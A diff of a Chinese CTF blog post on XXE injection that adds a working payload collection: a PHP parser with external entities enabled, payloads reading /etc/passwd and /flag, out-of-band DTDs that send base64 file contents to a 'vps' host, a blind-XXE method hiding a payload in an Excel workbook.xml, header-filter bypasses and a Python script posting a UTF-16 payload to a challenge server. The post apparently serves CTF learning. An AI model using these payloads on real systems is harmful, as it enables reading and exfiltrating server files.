@@ -23,21 +23,29 @@
     <meta name="description" content="">
     <meta name="description" content="libxml2.9.0之后默认不解析外部实体，php版本不影响XXE的利用web目录为： 123456$ tree ..├── dom.php # 示例：使用DOMDocument解析body├── index.php├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body└── simplexml_load_string.php # 示例：使">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XXE注入payload">
+<meta property="og:title" content="XXE注入">
 <meta property="og:url" content="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="libxml2.9.0之后默认不解析外部实体，php版本不影响XXE的利用web目录为： 123456$ tree ..├── dom.php # 示例：使用DOMDocument解析body├── index.php├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body└── simplexml_load_string.php # 示例：使">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220715155356983.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190218122525225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190218122601198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190218122639287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/201902181226592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019021812272363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190218122739222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-08-05T03:29:29.000Z">
-<meta property="article:modified_time" content="2021-07-30T09:17:22.360Z">
+<meta property="article:modified_time" content="2022-07-15T08:39:47.684Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="XXE">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220715155356983.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>XXE注入payload · HacKerQWQ&#39;s Studio</title>
+    <title>XXE注入 · HacKerQWQ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -232,7 +240,7 @@
                 <a href="/" >HacKerQWQ的博客空间</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">XXE注入payload</a>
+                <a href="#" class="post-name">XXE注入</a>
             </div>
     </div>
     
@@ -262,7 +270,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            XXE注入payload
+            XXE注入
             <!-- 404 -->
             
         </h1>
@@ -289,7 +297,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">673</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -422,6 +430,11 @@ height:50vh;
         <p>libxml2.9.0之后默认不解析外部实体，php版本不影响XXE的利用<br>web目录为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">├── index.php</span><br><span class="line">├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br></pre></td></tr></table></figure>
 
+<p>php读取xml代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($xmlfile))&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    $ctfshow = $creds-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> $ctfshow;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>函数介绍</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader  <span class="comment">#禁用/启用加载外部实体的功能     参数为true时为禁用，参数为false为启用</span></span><br><span class="line">file_get_contents(<span class="string">&#x27;php://input&#x27;</span>)   <span class="comment">#简单理解就是接受POST请求方式传的数据</span></span><br><span class="line">loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD) <span class="comment">#通过解析一个 XML 标签字符串来组成该文档</span></span><br><span class="line">simplexml_import_dom   <span class="comment">#把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line"></span><br><span class="line">$creds-&gt;ctfshow 获取页面中的ctfhsow元素</span><br></pre></td></tr></table></figure>
 
 <h1 id="XML和DTD格式"><a href="#XML和DTD格式" class="headerlink" title="XML和DTD格式"></a>XML和DTD格式</h1><ol>
 <li>XML格式<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don’t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></li>
@@ -429,22 +442,26 @@ height:50vh;
 
 </li>
 </ol>
-<h1 id="XEE注入"><a href="#XEE注入" class="headerlink" title="XEE注入"></a>XEE注入</h1><ol>
-<li>读入系统文件</li>
+<h1 id="XEE注入"><a href="#XEE注入" class="headerlink" title="XEE注入"></a>XEE注入</h1><p><strong>注意：有时候并不是只有上传xml的时候才有xxe，也可以试试将json改为xxe</strong></p>
+<ol>
+<li><p>读入系统文件</p>
+<p>方法一(有回显)：</p>
+</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTINY a SYSTEM <span class="string">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;xee;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTINY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps&#x2F;evil_read_password&quot;&gt; %remote;]&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+<p>方法二(vps读取dtd)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY % a SYSTEM <span class="string">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">%a;</span><br><span class="line">&lt;note&gt;&amp;xee;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
 
 <p>其中evil.dtd的格式为：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTINY xee SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
 
-<p>evil_read_password文件内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTSEM &#39;http:&#x2F;&#x2F;vps&#x2F;?xxe_local&#x3D;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+<p>方法三（读取文件内容发送到vps)：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xee</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps:9999/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xee;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>xxe.dtd文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;vps:7777&#x2F;xiaobai.php?1&#x3D;%file;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
 
-
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220715155356983.png" alt="image-20220715155356983"></p>
 <ol start="2">
 <li>拒绝服务攻击</li>
 </ol>
@@ -460,6 +477,43 @@ height:50vh;
 
 <ol start="5">
 <li>XInclude<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span>?&gt;</span><br><span class="line">&lt;data xmlns:xi=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;&lt;xi:include href=<span class="string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;&lt;/xi:include&gt;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="excel的XXE利用"><a href="#excel的XXE利用" class="headerlink" title="excel的XXE利用"></a>excel的XXE利用</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a>外部实体攻击非常常见，特别是通过基于HTTP的API，我们经常遇到并利用以此通常获得对客户端环境的特权访问。<br>不常见的是用Excel进行XXE攻击。</p>
+<h3 id="这是什么方式"><a href="#这是什么方式" class="headerlink" title="这是什么方式"></a>这是什么方式</h3><p>实际上，与所有post-Office 2007文件格式一样，现代Excel文件实际上只是XML文档的zip文件。这称为Office Open XML格式或OOXML。<br>许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。<br>在这篇文章中，我专注于Excel只是因为处理Excel文件比使用Word文档或Powerpoint更常见，但它肯定并不罕见，本文中的任何内容都可能适用于这些应用程序。</p>
+<h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>假设我们有一个接受Excel文件进行上传和处理的目标应用程序，我们就可以开始探测XXE了。相同的攻击有效负载可能会起作用，我们只需将它们放入Excel文件即可。<br>创建一个新的空白Excel文件。你可以在某些单元格中键入内容，但实际上并不是必需的。如果您没有安装Excel？您可以使用Google表格，然后下载为xlsx。<br>创建一个目录以将Excel文件解压缩并解压缩。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190218122525225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>用于攻击应用程序的文件会有所不同，这在很大程度上取决于所使用的库。xl/workbook.xml提供了工作簿内容的概述，通常是大多数解析开始的地方，因为它将包含工作表及其名称的列表。单个工作表本身位于xl/worksheets目录下，通常内容最终会进入xl/sharedStrings.xml。</p>
+<p>我在实际中发现了这一点，大多数应用程序似乎都会使用xl/workbook.xmlXML解析器来获取工作表列表，然后分别读取每个工作表以获取单元格内容。我还没有找到任何易受细胞影响的应用程序，但您的里程可能会有所不同。</p>
+<p>鉴于这种方法，根据经验，通常最好先尝试xl/workbook.xml，这就是我将在这篇文章中展示的内容。就像将XXE有效负载添加到此文件一样简单，将内容压缩回Excel文件并将其上传到应用程序。</p>
+<h3 id="使用BURP-COLLABORATOR对XXE进行盲测"><a href="#使用BURP-COLLABORATOR对XXE进行盲测" class="headerlink" title="使用BURP COLLABORATOR对XXE进行盲测"></a>使用BURP COLLABORATOR对XXE进行盲测</h3><p>在我们的演示应用程序中，无法将数据检索到HTTP响应中，因此所有这些XXE发现和利用都将是盲目的。我喜欢使用Burp Collaborator进行初始测试，因为阻止出站HTTP请求但允许DNS查询的情况并不少见。使用Collaborator我们可以看到两种交互并确认漏洞，即使我们可能无法轻易利用它。</p>
+<p>打开Burp Suite Professional，单击Burp菜单并选择“Burp Collaborator client”将其打开。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190218122601198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>单击“复制到剪贴板”。就我而言，值是gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net。现在我们将其插入到XML中。<br>打开xl/workbook.xml并将以下内容插入第2行和第3行。确保从Burp中粘贴你的值，而不是下面显示的值。:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>你的xl/workbook.xml现在会是像这样。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190218122639287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>现在将其压缩以创建新的Excel文件。</p>
+<p><img src="https://img-blog.csdnimg.cn/201902181226592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>现在将此poc.xlsx上传到你的应用程序。在这种情况下，有一个简单的ReactJS演示应用程序，它允许我们将文件拖入。你的应用程序应该会有所不同，但都是一个方式。</p>
+<p><img src="https://img-blog.csdnimg.cn/2019021812272363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>现在检查您的Burp Collaborator客户端，看看您是否有任何点击。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190218122739222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>成功。我们已确认XXE。</p>
+<h1 id="XXE绕过"><a href="#XXE绕过" class="headerlink" title="XXE绕过"></a>XXE绕过</h1><ol>
+<li><p>去xml头</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xee</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps:9999/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xee;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>version前加空格</p>
+<p>这种情况适用于简单的正则匹配xml头</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xee</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps:9999/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xee;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编码绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://813f9987-7aba-4dd1-b779-0cb3059fa45b.challenge.ctf.show/&quot;</span></span><br><span class="line">data=<span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE  xxe [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % xee SYSTEM &quot;http://82.157.161.5/xxe.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%xee;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;</span></span><br><span class="line"><span class="string">&lt;/root&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">requests.post(url,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
 
 </li>
 </ol>
@@ -484,7 +538,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">August 5th 2020, 11:29:29 am</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">July 30th 2021, 5:17:22 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/">July 15th 2022, 4:39:47 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -629,7 +683,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%92%8CDTD%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">XML和DTD格式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XEE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">XEE注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">3.</span> <span class="toc-text">XXE注入防御</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%92%8CDTD%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">XML和DTD格式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XEE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">XEE注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#excel%E7%9A%84XXE%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">excel的XXE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">这是什么方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E9%97%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8BURP-COLLABORATOR%E5%AF%B9XXE%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B5%8B"><span class="toc-number">2.1.4.</span> <span class="toc-text">使用BURP COLLABORATOR对XXE进行盲测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">XXE绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">XXE注入防御</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2927,9 +2981,367 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
